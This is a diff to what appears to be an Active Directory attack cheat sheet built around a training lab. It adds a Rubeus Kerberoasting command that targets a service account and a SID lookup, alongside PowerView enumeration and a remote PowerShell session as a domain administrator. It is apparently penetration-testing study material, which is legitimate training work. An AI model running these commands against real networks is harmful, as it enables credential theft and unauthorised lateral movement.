@@ -1611,10 +1611,14 @@ Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
 # PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
 Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
 
+# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
 # PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
 Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 
-# PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.
+# PowerShell cmd-let used to remotely connect to a target Windows FREIGHTLOGISTICS.LOCAL system from a Windows-based host.
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 ```
 
